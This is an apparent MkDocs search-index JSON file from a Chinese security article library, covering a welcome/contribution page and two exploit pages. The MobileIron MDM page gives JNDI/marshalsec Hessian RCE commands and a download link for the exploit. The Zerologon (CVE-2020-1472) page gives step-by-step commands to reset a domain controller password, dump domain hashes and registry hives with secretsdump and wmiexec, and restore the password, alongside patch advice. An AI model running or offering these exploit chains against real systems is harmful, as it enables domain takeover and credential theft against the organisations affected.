{"config":{"lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"\u5c0a\u656c\u7684\u767d\u5ba2\uff0c\u6b22\u8fce\u5165\u9a7b\u767d\u9601 \u00b6 \u6ce8\u610f\u4e8b\u9879 \u00b6 \u4e0d\u5f97\u79c1\u81ea\u5206\u4eab\u767d\u9601\u6587\u7ae0\u5185\u5bb9 \u767d\u9601\u6210\u5458\u9700\u56e2\u7ed3\u53cb\u7231\uff0c\u4e92\u5e2e\u4e92\u52a9\u3002\u7231\u4e2d\u56fd\u5171\u4ea7\u515a\uff0c\u7231\u7956\u56fd\u7231\u4eba\u6c11\uff0c\u9c9c\u8273\u7684\u7ea2\u9886\u5dfe\uff0c\u98d8\u626c\u5728\u5fc3\u4e2d\u3002 \u767d\u9601\u91c7\u7528\u5b81\u6740\u9519\u4e0d\u653e\u8fc7\u601d\u60f3\uff0c\u53ea\u8981\u89e6\u53d1\u5b89\u5168\u9632\u5fa1\u673a\u5236\u8fbe\u5230\u9608\u503c\uff0c\u76f4\u63a5\u6c38\u4e45\u5c01\u7981ID\u53caIP\u3002 \u5b9a\u671f\u5bf9\u4e0d\u6d3b\u8dc3\u767b\u5f55\u6210\u5458\u6e05\u7406 \u9519\u8bef\u4fee\u6539 \u00b6 \u5173\u4e8e\u9875\u9762\u51fa\u73b0\u7684\u9519\u8bef\uff0c\u53ef\u4ee5\u76f4\u63a5\u5728\u6240\u5728\u9875\u9762\u53f3\u4e0a\u89d2\u70b9\u51fb \ud83d\udd8a \u7b26\u53f7\u8fdb\u884c\u4fee\u6539\u63d0\u4ea4\u3002 \u8d21\u732e\u6307\u5357 \u00b6 \u8d21\u732e\u6587\u6863\u8981\u6c42 \u00b6 \u5f53\u4f60\u6253\u7b97\u8d21\u732e\u67d0\u90e8\u5206\u7684\u5185\u5bb9\u65f6\uff0c\u4f60\u5e94\u8be5\u5c3d\u91cf\u786e\u4fdd \u6587\u6863\u5185\u5bb9\u6ee1\u8db3\u57fa\u672c\u683c\u5f0f\u8981\u6c42 \u6587\u6863\u7684\u5408\u7406\u6027\u4ee5\u53ca\u51c6\u786e\u6027 \u6587\u6863\u56fe\u7247\u4ee5\u53ca\u9644\u4ef6\u7684\u5b58\u50a8\u683c\u5f0f \u6587\u6863\u5b58\u50a8\u683c\u5f0f \u00b6 1.\u76ee\u524d\u4ed3\u5e93\u53ea\u63a5\u53d7 Markdown \u683c\u5f0f\u7684\u8d21\u732e\u63d0\u4ea4\uff0c\u5982\u679c\u6709\u5176\u4ed6\u683c\u5f0f\u7684\u63d0\u4ea4\u8bf7\u8054\u7cfb\u6211\u4eec\u8fdb\u884c\u8f6c\u6362\u3002 2.\u6587\u7ae0\u5185\u56fe\u7247\u5b58\u50a8\u8981\u6c42\uff1a\u5982\u679c\u6587\u7ae0\u5185\u6709\u56fe\u7247\u6f14\u793a\u7b49\uff0c\u5e94\u5c06\u56fe\u7247\u653e\u5728\u672c\u5730\uff0c\u907f\u514d\u4f7f\u7528\u5916\u94fe\u3002\u63a8\u8350\u4f7f\u7528\u76f8\u5bf9\u8def\u5f84\u8fdb\u884c\u56fe\u7247\u7d22\u5f15\u94fe\u63a5\uff0c\u590d\u5236\u56fe\u7247\u5230\u4e0e\u5f53\u524d\u6587\u6863\u540c\u540d\u7684\u6587\u4ef6\u5939\u4e0b\uff0c\u6216\u53ef\u76f4\u63a5\u5728 MarkDown \u8f6f\u4ef6\u4e2d\u8bbe\u7f6e\u590d\u5236\u56fe\u7247\u5230\u6307\u5b9a\u8def\u5f84\uff0c\u56fe\u7247\u5b58\u50a8\u4f4d\u7f6e\u7b56\u7565\u4ee3\u7801\u5982\u4e0b\uff1a ./${filename} \u5176\u4e2d ./${filename} \u8868\u793a\u5f53\u524d\u6587\u4ef6\u540d\uff0c\u5177\u4f53\u6848\u4f8b\u6f14\u793a\u5982\u4e0b\uff1a \u5047\u8bbe\u6211\u6709\u4e00\u7bc7\u540d\u4e3a xss \u6280\u672f\u603b\u7ed3.md \u7684\u6587\u7ae0\uff0c\u91cc\u9762\u6709\u82e5\u5e72\u56fe\u7247\uff0c\u90a3\u4e48\u56fe\u7247\u5e94\u8be5\u5b58\u50a8\u5728 xss \u6280\u672f\u603b\u7ed3 \u8fd9\u4e2a\u6587\u4ef6\u5939\u5185\uff0c\u63d0\u4ea4\u65f6\u5e94\u5f53\u5c06\u6b64\u6587\u4ef6\u5939\u548c .md \u6587\u4ef6\u4e00\u540c\u63d0\u4ea4\u3002 \u8d21\u732e\u611f\u8c22 \u00b6 \u611f\u8c22\u4ee5\u4e0b\u767d\u5ba2\u5bf9\u4e8e\u767d\u9601\u6587\u5e93\u7684\u8d21\u732e\uff1a \u798f\u6797\u8868\u54e5\u3001Lx\u3001mys3t\u3001hps_fly\u3001NickName\u3001return0\u3001loveU\u3001x77\u3001m_ing\u3001aaaahui\u3001Wizard \u5173\u4e8e\u6587\u5e93 \u00b6 \u767d\u9601\u6587\u5e93\u6587\u7ae0\u5747\u6765\u81ea\u7f51\u7edc\u6587\u7ae0\u7efc\u5408\u548c\u56e2\u961f\u539f\u521b\uff0c\u5bf9\u4e8e\u6709\u53ef\u6eaf\u6765\u6e90\u7684\u6587\u7ae0\u6211\u4eec\u5c06\u4f1a\u6ce8\u660e\u6765\u6e90\uff0c\u5bf9\u5f15\u7528\u53c2\u8003\u5185\u5bb9\u7684\u6587\u7ae0\uff0c\u6211\u4eec\u5c06\u4f1a\u5728\u6bcf\u7bc7\u6587\u7ae0\u672b\u6807\u6ce8\u5f15\u7528\u53c2\u8003\u6765\u6e90\u3002\u5982\u6709\u6587\u7ae0\u6765\u6e90\u548c\u53c2\u8003\u94fe\u63a5\u66f4\u65b0\u4e0d\u53ca\u65f6\u7684\u60c5\u51b5\uff0c\u8bf7\u5404\u4f4d\u53ca\u65f6\u6279\u8bc4\u6307\u6b63\u3002 \u5173\u4e8e\u767d\u9601\u6587\u5e93\u7684\u6587\u7ae0\uff0c\u76ee\u524d\u6b63\u5728\u4e0d\u65ad\u7684\u8fdb\u884c\u66f4\u65b0\u6269\u5145\u4e2d...","title":"\u5c0a\u656c\u7684\u767d\u5ba2\uff0c\u6b22\u8fce\u5165\u9a7b\u767d\u9601"},{"location":"#_1","text":"","title":"\u5c0a\u656c\u7684\u767d\u5ba2\uff0c\u6b22\u8fce\u5165\u9a7b\u767d\u9601"},{"location":"#_2","text":"\u4e0d\u5f97\u79c1\u81ea\u5206\u4eab\u767d\u9601\u6587\u7ae0\u5185\u5bb9 \u767d\u9601\u6210\u5458\u9700\u56e2\u7ed3\u53cb\u7231\uff0c\u4e92\u5e2e\u4e92\u52a9\u3002\u7231\u4e2d\u56fd\u5171\u4ea7\u515a\uff0c\u7231\u7956\u56fd\u7231\u4eba\u6c11\uff0c\u9c9c\u8273\u7684\u7ea2\u9886\u5dfe\uff0c\u98d8\u626c\u5728\u5fc3\u4e2d\u3002 \u767d\u9601\u91c7\u7528\u5b81\u6740\u9519\u4e0d\u653e\u8fc7\u601d\u60f3\uff0c\u53ea\u8981\u89e6\u53d1\u5b89\u5168\u9632\u5fa1\u673a\u5236\u8fbe\u5230\u9608\u503c\uff0c\u76f4\u63a5\u6c38\u4e45\u5c01\u7981ID\u53caIP\u3002 \u5b9a\u671f\u5bf9\u4e0d\u6d3b\u8dc3\u767b\u5f55\u6210\u5458\u6e05\u7406","title":"\u6ce8\u610f\u4e8b\u9879"},{"location":"#_3","text":"\u5173\u4e8e\u9875\u9762\u51fa\u73b0\u7684\u9519\u8bef\uff0c\u53ef\u4ee5\u76f4\u63a5\u5728\u6240\u5728\u9875\u9762\u53f3\u4e0a\u89d2\u70b9\u51fb \ud83d\udd8a \u7b26\u53f7\u8fdb\u884c\u4fee\u6539\u63d0\u4ea4\u3002","title":"\u9519\u8bef\u4fee\u6539"},{"location":"#_4","text":"","title":"\u8d21\u732e\u6307\u5357"},{"location":"#_5","text":"\u5f53\u4f60\u6253\u7b97\u8d21\u732e\u67d0\u90e8\u5206\u7684\u5185\u5bb9\u65f6\uff0c\u4f60\u5e94\u8be5\u5c3d\u91cf\u786e\u4fdd \u6587\u6863\u5185\u5bb9\u6ee1\u8db3\u57fa\u672c\u683c\u5f0f\u8981\u6c42 \u6587\u6863\u7684\u5408\u7406\u6027\u4ee5\u53ca\u51c6\u786e\u6027 \u6587\u6863\u56fe\u7247\u4ee5\u53ca\u9644\u4ef6\u7684\u5b58\u50a8\u683c\u5f0f","title":"\u8d21\u732e\u6587\u6863\u8981\u6c42"},{"location":"#_6","text":"1.\u76ee\u524d\u4ed3\u5e93\u53ea\u63a5\u53d7 Markdown \u683c\u5f0f\u7684\u8d21\u732e\u63d0\u4ea4\uff0c\u5982\u679c\u6709\u5176\u4ed6\u683c\u5f0f\u7684\u63d0\u4ea4\u8bf7\u8054\u7cfb\u6211\u4eec\u8fdb\u884c\u8f6c\u6362\u3002 2.\u6587\u7ae0\u5185\u56fe\u7247\u5b58\u50a8\u8981\u6c42\uff1a\u5982\u679c\u6587\u7ae0\u5185\u6709\u56fe\u7247\u6f14\u793a\u7b49\uff0c\u5e94\u5c06\u56fe\u7247\u653e\u5728\u672c\u5730\uff0c\u907f\u514d\u4f7f\u7528\u5916\u94fe\u3002\u63a8\u8350\u4f7f\u7528\u76f8\u5bf9\u8def\u5f84\u8fdb\u884c\u56fe\u7247\u7d22\u5f15\u94fe\u63a5\uff0c\u590d\u5236\u56fe\u7247\u5230\u4e0e\u5f53\u524d\u6587\u6863\u540c\u540d\u7684\u6587\u4ef6\u5939\u4e0b\uff0c\u6216\u53ef\u76f4\u63a5\u5728 MarkDown \u8f6f\u4ef6\u4e2d\u8bbe\u7f6e\u590d\u5236\u56fe\u7247\u5230\u6307\u5b9a\u8def\u5f84\uff0c\u56fe\u7247\u5b58\u50a8\u4f4d\u7f6e\u7b56\u7565\u4ee3\u7801\u5982\u4e0b\uff1a ./${filename} \u5176\u4e2d ./${filename} \u8868\u793a\u5f53\u524d\u6587\u4ef6\u540d\uff0c\u5177\u4f53\u6848\u4f8b\u6f14\u793a\u5982\u4e0b\uff1a \u5047\u8bbe\u6211\u6709\u4e00\u7bc7\u540d\u4e3a xss \u6280\u672f\u603b\u7ed3.md \u7684\u6587\u7ae0\uff0c\u91cc\u9762\u6709\u82e5\u5e72\u56fe\u7247\uff0c\u90a3\u4e48\u56fe\u7247\u5e94\u8be5\u5b58\u50a8\u5728 xss \u6280\u672f\u603b\u7ed3 \u8fd9\u4e2a\u6587\u4ef6\u5939\u5185\uff0c\u63d0\u4ea4\u65f6\u5e94\u5f53\u5c06\u6b64\u6587\u4ef6\u5939\u548c .md \u6587\u4ef6\u4e00\u540c\u63d0\u4ea4\u3002","title":"\u6587\u6863\u5b58\u50a8\u683c\u5f0f"},{"location":"#_7","text":"\u611f\u8c22\u4ee5\u4e0b\u767d\u5ba2\u5bf9\u4e8e\u767d\u9601\u6587\u5e93\u7684\u8d21\u732e\uff1a \u798f\u6797\u8868\u54e5\u3001Lx\u3001mys3t\u3001hps_fly\u3001NickName\u3001return0\u3001loveU\u3001x77\u3001m_ing\u3001aaaahui\u3001Wizard","title":"\u8d21\u732e\u611f\u8c22"},{"location":"#_8","text":"\u767d\u9601\u6587\u5e93\u6587\u7ae0\u5747\u6765\u81ea\u7f51\u7edc\u6587\u7ae0\u7efc\u5408\u548c\u56e2\u961f\u539f\u521b\uff0c\u5bf9\u4e8e\u6709\u53ef\u6eaf\u6765\u6e90\u7684\u6587\u7ae0\u6211\u4eec\u5c06\u4f1a\u6ce8\u660e\u6765\u6e90\uff0c\u5bf9\u5f15\u7528\u53c2\u8003\u5185\u5bb9\u7684\u6587\u7ae0\uff0c\u6211\u4eec\u5c06\u4f1a\u5728\u6bcf\u7bc7\u6587\u7ae0\u672b\u6807\u6ce8\u5f15\u7528\u53c2\u8003\u6765\u6e90\u3002\u5982\u6709\u6587\u7ae0\u6765\u6e90\u548c\u53c2\u8003\u94fe\u63a5\u66f4\u65b0\u4e0d\u53ca\u65f6\u7684\u60c5\u51b5\uff0c\u8bf7\u5404\u4f4d\u53ca\u65f6\u6279\u8bc4\u6307\u6b63\u3002 \u5173\u4e8e\u767d\u9601\u6587\u5e93\u7684\u6587\u7ae0\uff0c\u76ee\u524d\u6b63\u5728\u4e0d\u65ad\u7684\u8fdb\u884c\u66f4\u65b0\u6269\u5145\u4e2d...","title":"\u5173\u4e8e\u6587\u5e93"},{"location":"Web%E5%AE%89%E5%85%A8/MobileIron%20MDM%20%E6%9C%AA%E6%8E%88%E6%9D%83RCE%20EXP/","text":"\u6b65\u9aa4 \u00b6 java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -A 0.0.0.0 -C \"<Command>\" java -cp ./marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Hessian SpringAbstractBeanFactoryPointcutAdvisor rmi://<server-ip>:1099/<codebase> > exp python hessian.py -p exp -u 'https://mobileiron-mdm-instance/mifs/.;/services/LogService' EXP \u94fe\u63a5\uff1ahttps://pan.baidu.com/s/1jna0ZY-8BqRETUkYiJr5RQ \u63d0\u53d6\u7801\uff1anh3f","title":"MobileIron MDM \u672a\u6388\u6743RCE EXP"},{"location":"Web%E5%AE%89%E5%85%A8/MobileIron%20MDM%20%E6%9C%AA%E6%8E%88%E6%9D%83RCE%20EXP/#_1","text":"java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -A 0.0.0.0 -C \"<Command>\" java -cp ./marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Hessian SpringAbstractBeanFactoryPointcutAdvisor rmi://<server-ip>:1099/<codebase> > exp python hessian.py -p exp -u 'https://mobileiron-mdm-instance/mifs/.;/services/LogService' EXP \u94fe\u63a5\uff1ahttps://pan.baidu.com/s/1jna0ZY-8BqRETUkYiJr5RQ \u63d0\u53d6\u7801\uff1anh3f","title":"\u6b65\u9aa4"},{"location":"Web%E5%AE%89%E5%85%A8/Netlogon%20%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-1472%EF%BC%89/","text":"\u80cc\u666f \u00b6 NetLogon\u7279\u6743\u63d0\u5347\u6f0f\u6d1e\uff08CVE-2020-1472\uff09\u7684\u8be6\u7ec6\u4fe1\u606f\u4e0e\u9a8c\u8bc1\u811a\u672c\uff0c\u5bfc\u81f4\u6f0f\u6d1e\u98ce\u9669\u9aa4\u7136\u63d0\u5347\u3002\u672a\u7ecf\u8eab\u4efd\u9a8c\u8bc1\u7684\u653b\u51fb\u8005\u901a\u8fc7NetLogon\u8fdc\u7a0b\u534f\u8bae\uff08MS-NRPC\uff09\u5efa\u7acb\u4e0e\u57df\u63a7\u5236\u5668\u8fde\u63a5\u7684 \u5b89\u5168\u901a\u9053\u65f6\uff0c\u53ef\u5229\u7528\u6b64\u6f0f\u6d1e\u83b7\u53d6\u57df\u7ba1\u7406\u5458\u8bbf\u95ee\u6743\u9650\u3002\u6b64\u6f0f\u6d1e\u4e3a\u5fae\u8f6f8\u6708\u8865\u4e01\u66f4\u65b0\u65f6\u62ab\u9732\uff0cCVSS\u8bc4\u5206\u4e3a10\uff0c\u5f71\u54cd\u5e7f\u6cdb\uff0c\u8bf7\u76f8\u5173\u7528\u6237\u5c3d\u5feb\u91c7\u53d6\u63aa\u65bd\u8fdb\u884c\u9632\u62a4\u3002 \u53d7\u5f71\u54cd\u7248\u672c \u00b6 Windows Server 2008 R2 for x64-based Systems Service Pack 1 Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation) Windows Server 2012 Windows Server 2012 (Server Core installation) Windows Server 2012 R2 Windows Server 2012 R2 (Server Core installation) Windows Server 2016 Windows Server 2016 (Server Core installation) Windows Server 2019 Windows Server 2019 (Server Core installation) Windows Server, version 1903 (Server Core installation) Windows Server, version 1909 (Server Core installation) Windows Server, version 2004 (Server Core installation) \u6f0f\u6d1e\u68c0\u6d4b \u00b6 poc \u94fe\u63a5\uff1a https://pan.baidu.com/s/1_RpVEA4W_Lo_ildh-FdqKQ \u63d0\u53d6\u7801\uff1atilx \u53d7\u5f71\u54cd\u7248\u672c\u4e3b\u673a\uff0c\u68c0\u6d4b\u9a8c\u8bc1\u7ed3\u679c\u5982\u4e0b\uff1a \u6f0f\u6d1e\u5229\u7528 \u00b6 1.\u91cd\u7f6e\u5bc6\u7801\uff0c\u83b7\u53d6\u57df\u5185\u6240\u6709\u7684\u7528\u6237hash\uff0c\u5229\u7528exp\uff1a`https://github.com/dirkjanm/CVE-2020-1472 ` py -3 cve-2020-1472-exploit.py dc-01 192.169.1.253 2.Dump\u57df\u63a7\u5236\u4e0a\u7684hash py -3 secretsdump.py xxxxx/dc-01\\$@192.168.1.253 -no-pass 3.\u5229\u7528\u83b7\u53d6\u5230\u7684\u7ba1\u7406\u5458hash\u8fdc\u7a0b\u8fde\u63a5\u5bfc\u51fasam\u6570\u636e\u5e93\u4e2d\u539f\u6765\u7684\u8ba1\u7b97\u673ahash``` py -3 wmiexec.py -hashes [hash] xxxx/administrator@192.168.1.253 reg save HKLM\\SYSTEM system.save reg save HKLM\\SAM sam.save reg saveHKLM\\SECURITY security.save get system.save get sam.save get security.save del /f system.save del /f sam.save del /f security.save exit py -3 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL \u4ece\u800c\u83b7\u53d6\u5230MACHINE.ACC\uff1axxxxxxxxxxxxxxxxxxx 4.\u6062\u590dntds.dit\u4e2d\u7684\u8ba1\u7b97\u673ahash\u5e76\u9a8c\u8bc1\uff1a`https://github.com/risksense/zerologon` \u9700\u8981\u6ce8\u610f\u7684\u662f\u6700\u540e\u7684hash\u4f7f\u7528\u7684\u662f\u4e0a\u56fe\u83b7\u53d6\u5230\u7684MACHINE.ACC\u201d:\u201d\u540e\u9762\u7684\u90e8\u5206\u3002 py -3 reinstall_original_pw.py dc-01 192.168.253.163 [\u4e0a\u4e00\u6b65\u83b7\u53d6\u5230\u7684hash] 5.\u6700\u540e\u9a8c\u8bc1\u5bc6\u7801\u662f\u5426\u5df2\u7ecf\u6539\u56de\u53bb\uff0c\u6ce8\u610f\u7ed3\u5c3e\u662f\u5200\u4e50\u7b26\u3002 py -3 secretsdump xxxx/administrator:admin123#@!..@192.168.1.253 -just-dc-user dc-01\\\u5200\u4e50\u7b26 ``` \u6f0f\u6d1e\u9632\u62a4 \u00b6 1)\u5b98\u65b9\u5347\u7ea7 \u76ee\u524d\u5fae\u8f6f\u5b98\u65b9\u5df2\u9488\u5bf9\u53d7\u652f\u6301\u7684\u4ea7\u54c1\u7248\u672c\u53d1\u5e03\u4e86\u4fee\u590d\u6b64\u6f0f\u6d1e\u7684\u5b89\u5168\u8865\u4e01\uff0c\u5f3a\u70c8\u5efa\u8bae\u53d7\u5f71\u54cd\u7528\u6237\u5c3d\u5feb\u5b89\u88c5\u8865\u4e01\u8fdb\u884c\u9632\u62a4\uff0c\u5b98\u65b9\u4e0b\u8f7d\u94fe\u63a5\uff1a https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-1472 2\uff09\u5176\u4ed6\u9632\u62a4\u63aa\u65bd \u5728\u5b89\u88c5\u66f4\u65b0\u8865\u4e01\u540e\uff0c\u8fd8\u53ef\u901a\u8fc7\u90e8\u7f72\u57df\u63a7\u5236\u5668 (DC) \u5f3a\u5236\u6a21\u5f0f\u4ee5\u514d\u53d7\u5230\u8be5\u6f0f\u6d1e\u5f71\u54cd\uff1a \u8bf7\u53c2\u8003\u5b98\u65b9\u6587\u6863\u8fdb\u884c\u914d\u7f6e\u300a\u5982\u4f55\u7ba1\u7406\u4e0e CVE-2020-1472 \u76f8\u5173\u7684 Netlogon \u5b89\u5168\u901a\u9053\u8fde\u63a5\u7684\u66f4\u6539\u300b\uff1a https://support.microsoft.com/zh-cn/help/4557222/how-to-manage-the-changes-in-netlogon-secure-channel-connections-assoc \u6ce8\u610f\u4e8b\u9879 \u00b6 \u7531\u4e8e\u7f51\u7edc\u95ee\u9898\u3001\u8ba1\u7b97\u673a\u73af\u5883\u95ee\u9898\u7b49\u539f\u56e0\uff0cWindows Update\u7684\u8865\u4e01\u66f4\u65b0\u53ef\u80fd\u51fa\u73b0\u5931\u8d25\u3002\u7528\u6237\u5728\u5b89\u88c5\u8865\u4e01\u540e\uff0c\u5e94\u53ca\u65f6\u68c0\u67e5\u8865\u4e01\u662f\u5426\u6210\u529f\u66f4\u65b0\u3002 \u8865\u4e01\u66f4\u65b0\u786e\u8ba4\uff1a \u53f3\u952e\u70b9\u51fbWindows\u56fe\u6807\uff0c\u9009\u62e9\u201c\u8bbe\u7f6e(N)\u201d\uff0c\u9009\u62e9\u201c\u66f4\u65b0\u548c\u5b89\u5168\u201d-\u201cWindows\u66f4\u65b0\u201d\uff0c\u67e5\u770b\u8be5\u9875\u9762\u4e0a\u7684\u63d0\u793a\u4fe1\u606f\uff0c\u4e5f\u53ef\u70b9\u51fb\u201c\u67e5\u770b\u66f4\u65b0\u5386\u53f2\u8bb0\u5f55\u201d\u67e5\u770b\u5386\u53f2\u66f4\u65b0\u60c5\u51b5\u3002 \u9488\u5bf9\u672a\u6210\u529f\u5b89\u88c5\u7684\u66f4\u65b0\uff0c\u53ef\u70b9\u51fb\u66f4\u65b0\u540d\u79f0\u8df3\u8f6c\u5230\u5fae\u8f6f\u5b98\u65b9\u4e0b\u8f7d\u9875\u9762\uff0c\u5efa\u8bae\u7528\u6237\u70b9\u51fb\u8be5\u9875\u9762\u4e0a\u7684\u94fe\u63a5\uff0c\u8f6c\u5230\u201cMicrosoft\u66f4\u65b0\u76ee\u5f55\u201d\u7f51\u7ad9\u4e0b\u8f7d\u72ec\u7acb\u7a0b\u5e8f\u5305\u5e76\u5b89\u88c5\u3002","title":"Netlogon \u7279\u6743\u63d0\u5347\u6f0f\u6d1e\uff08CVE-2020-1472\uff09"},{"location":"Web%E5%AE%89%E5%85%A8/Netlogon%20%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-1472%EF%BC%89/#_1","text":"NetLogon\u7279\u6743\u63d0\u5347\u6f0f\u6d1e\uff08CVE-2020-1472\uff09\u7684\u8be6\u7ec6\u4fe1\u606f\u4e0e\u9a8c\u8bc1\u811a\u672c\uff0c\u5bfc\u81f4\u6f0f\u6d1e\u98ce\u9669\u9aa4\u7136\u63d0\u5347\u3002\u672a\u7ecf\u8eab\u4efd\u9a8c\u8bc1\u7684\u653b\u51fb\u8005\u901a\u8fc7NetLogon\u8fdc\u7a0b\u534f\u8bae\uff08MS-NRPC\uff09\u5efa\u7acb\u4e0e\u57df\u63a7\u5236\u5668\u8fde\u63a5\u7684 \u5b89\u5168\u901a\u9053\u65f6\uff0c\u53ef\u5229\u7528\u6b64\u6f0f\u6d1e\u83b7\u53d6\u57df\u7ba1\u7406\u5458\u8bbf\u95ee\u6743\u9650\u3002\u6b64\u6f0f\u6d1e\u4e3a\u5fae\u8f6f8\u6708\u8865\u4e01\u66f4\u65b0\u65f6\u62ab\u9732\uff0cCVSS\u8bc4\u5206\u4e3a10\uff0c\u5f71\u54cd\u5e7f\u6cdb\uff0c\u8bf7\u76f8\u5173\u7528\u6237\u5c3d\u5feb\u91c7\u53d6\u63aa\u65bd\u8fdb\u884c\u9632\u62a4\u3002","title":"\u80cc\u666f"},{"location":"Web%E5%AE%89%E5%85%A8/Netlogon%20%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-1472%EF%BC%89/#_2","text":"Windows Server 2008 R2 for x64-based Systems Service Pack 1 Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation) Windows Server 2012 Windows Server 2012 (Server Core installation) Windows Server 2012 R2 Windows Server 2012 R2 (Server Core installation) Windows Server 2016 Windows Server 2016 (Server Core installation) Windows Server 2019 Windows Server 2019 (Server Core installation) Windows Server, version 1903 (Server Core installation) Windows Server, version 1909 (Server Core installation) Windows Server, version 2004 (Server Core installation)","title":"\u53d7\u5f71\u54cd\u7248\u672c"},{"location":"Web%E5%AE%89%E5%85%A8/Netlogon%20%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-1472%EF%BC%89/#_3","text":"poc \u94fe\u63a5\uff1a https://pan.baidu.com/s/1_RpVEA4W_Lo_ildh-FdqKQ \u63d0\u53d6\u7801\uff1atilx \u53d7\u5f71\u54cd\u7248\u672c\u4e3b\u673a\uff0c\u68c0\u6d4b\u9a8c\u8bc1\u7ed3\u679c\u5982\u4e0b\uff1a","title":"\u6f0f\u6d1e\u68c0\u6d4b"},{"location":"Web%E5%AE%89%E5%85%A8/Netlogon%20%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-1472%EF%BC%89/#_4","text":"1.\u91cd\u7f6e\u5bc6\u7801\uff0c\u83b7\u53d6\u57df\u5185\u6240\u6709\u7684\u7528\u6237hash\uff0c\u5229\u7528exp\uff1a`https://github.com/dirkjanm/CVE-2020-1472 ` py -3 cve-2020-1472-exploit.py dc-01 192.169.1.253 2.Dump\u57df\u63a7\u5236\u4e0a\u7684hash py -3 secretsdump.py xxxxx/dc-01\\$@192.168.1.253 -no-pass 3.\u5229\u7528\u83b7\u53d6\u5230\u7684\u7ba1\u7406\u5458hash\u8fdc\u7a0b\u8fde\u63a5\u5bfc\u51fasam\u6570\u636e\u5e93\u4e2d\u539f\u6765\u7684\u8ba1\u7b97\u673ahash``` py -3 wmiexec.py -hashes [hash] xxxx/administrator@192.168.1.253 reg save HKLM\\SYSTEM system.save reg save HKLM\\SAM sam.save reg saveHKLM\\SECURITY security.save get system.save get sam.save get security.save del /f system.save del /f sam.save del /f security.save exit py -3 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL \u4ece\u800c\u83b7\u53d6\u5230MACHINE.ACC\uff1axxxxxxxxxxxxxxxxxxx 4.\u6062\u590dntds.dit\u4e2d\u7684\u8ba1\u7b97\u673ahash\u5e76\u9a8c\u8bc1\uff1a`https://github.com/risksense/zerologon` \u9700\u8981\u6ce8\u610f\u7684\u662f\u6700\u540e\u7684hash\u4f7f\u7528\u7684\u662f\u4e0a\u56fe\u83b7\u53d6\u5230\u7684MACHINE.ACC\u201d:\u201d\u540e\u9762\u7684\u90e8\u5206\u3002 py -3 reinstall_original_pw.py dc-01 192.168.253.163 [\u4e0a\u4e00\u6b65\u83b7\u53d6\u5230\u7684hash] 5.\u6700\u540e\u9a8c\u8bc1\u5bc6\u7801\u662f\u5426\u5df2\u7ecf\u6539\u56de\u53bb\uff0c\u6ce8\u610f\u7ed3\u5c3e\u662f\u5200\u4e50\u7b26\u3002 py -3 secretsdump xxxx/administrator:admin123#@!..@192.168.1.253 -just-dc-user dc-01\\\u5200\u4e50\u7b26 ```","title":"\u6f0f\u6d1e\u5229\u7528"},{"location":"Web%E5%AE%89%E5%85%A8/Netlogon%20%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-1472%EF%BC%89/#_5","text":"1)\u5b98\u65b9\u5347\u7ea7 \u76ee\u524d\u5fae\u8f6f\u5b98\u65b9\u5df2\u9488\u5bf9\u53d7\u652f\u6301\u7684\u4ea7\u54c1\u7248\u672c\u53d1\u5e03\u4e86\u4fee\u590d\u6b64\u6f0f\u6d1e\u7684\u5b89\u5168\u8865\u4e01\uff0c\u5f3a\u70c8\u5efa\u8bae\u53d7\u5f71\u54cd\u7528\u6237\u5c3d\u5feb\u5b89\u88c5\u8865\u4e01\u8fdb\u884c\u9632\u62a4\uff0c\u5b98\u65b9\u4e0b\u8f7d\u94fe\u63a5\uff1a https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-1472 2\uff09\u5176\u4ed6\u9632\u62a4\u63aa\u65bd \u5728\u5b89\u88c5\u66f4\u65b0\u8865\u4e01\u540e\uff0c\u8fd8\u53ef\u901a\u8fc7\u90e8\u7f72\u57df\u63a7\u5236\u5668 (DC) \u5f3a\u5236\u6a21\u5f0f\u4ee5\u514d\u53d7\u5230\u8be5\u6f0f\u6d1e\u5f71\u54cd\uff1a \u8bf7\u53c2\u8003\u5b98\u65b9\u6587\u6863\u8fdb\u884c\u914d\u7f6e\u300a\u5982\u4f55\u7ba1\u7406\u4e0e CVE-2020-1472 \u76f8\u5173\u7684 Netlogon \u5b89\u5168\u901a\u9053\u8fde\u63a5\u7684\u66f4\u6539\u300b\uff1a https://support.microsoft.com/zh-cn/help/4557222/how-to-manage-the-changes-in-netlogon-secure-channel-connections-assoc","title":"\u6f0f\u6d1e\u9632\u62a4"},{"location":"Web%E5%AE%89%E5%85%A8/Netlogon%20%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-1472%EF%BC%89/#_6","text":"\u7531\u4e8e\u7f51\u7edc\u95ee\u9898\u3001\u8ba1\u7b97\u673a\u73af\u5883\u95ee\u9898\u7b49\u539f\u56e0\uff0cWindows Update\u7684\u8865\u4e01\u66f4\u65b0\u53ef\u80fd\u51fa\u73b0\u5931\u8d25\u3002\u7528\u6237\u5728\u5b89\u88c5\u8865\u4e01\u540e\uff0c\u5e94\u53ca\u65f6\u68c0\u67e5\u8865\u4e01\u662f\u5426\u6210\u529f\u66f4\u65b0\u3002 \u8865\u4e01\u66f4\u65b0\u786e\u8ba4\uff1a 